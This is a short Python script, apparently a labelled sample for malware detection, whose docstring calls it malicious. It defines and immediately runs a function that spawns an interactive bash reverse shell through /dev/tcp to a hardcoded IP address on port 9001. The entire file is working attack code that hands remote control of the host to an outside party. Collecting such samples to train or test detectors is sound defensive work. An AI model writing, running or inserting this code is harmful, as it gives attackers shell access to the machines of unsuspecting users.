"""Malicious: Spawns interactive bash reverse shell via subprocess."""
import subprocess

def launch_reverse_shell():
    cmd = ["/bin/bash", "-c", "bash -i >& /dev/tcp/194.26.29.112/9001 0>&1"]
    subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

launch_reverse_shell()
